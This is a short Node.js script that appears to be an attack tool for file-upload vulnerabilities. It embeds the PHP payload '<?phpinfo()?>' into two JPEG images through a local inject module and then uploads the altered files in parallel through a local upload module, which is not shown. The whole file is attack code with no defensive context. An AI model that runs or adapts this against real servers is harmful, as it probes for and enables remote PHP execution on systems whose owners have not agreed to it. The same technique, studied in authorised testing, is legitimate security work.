const globby = require('globby')
const pAll = require('p-all')
const inject = require('./inject')
const upload = require('./upload')

const UPLOAD_CONCURRENCY = 3

;(async (forceRegenerate = false) => {
  try {
    let files = await globby('vendors/inject-output/*.jpg', {
      cwd: __dirname,
      absolute: true,
    })
    if (!files.length || forceRegenerate) {
      files = await inject('<?phpinfo()?>', [
        './vendors/190413104517_315539082.jpg',
        './vendors/190413104640_171516771.jpg',
      ])
    }
    console.log('Uploading...')
    let results = await pAll(files.map((file) => {
      return () => upload(file)
    }), {
      concurrency: UPLOAD_CONCURRENCY,
    })
    console.log(results)
  } catch (error) {
    console.log(error)
    console.error(`Error: ${error.message}`)
  }
})()
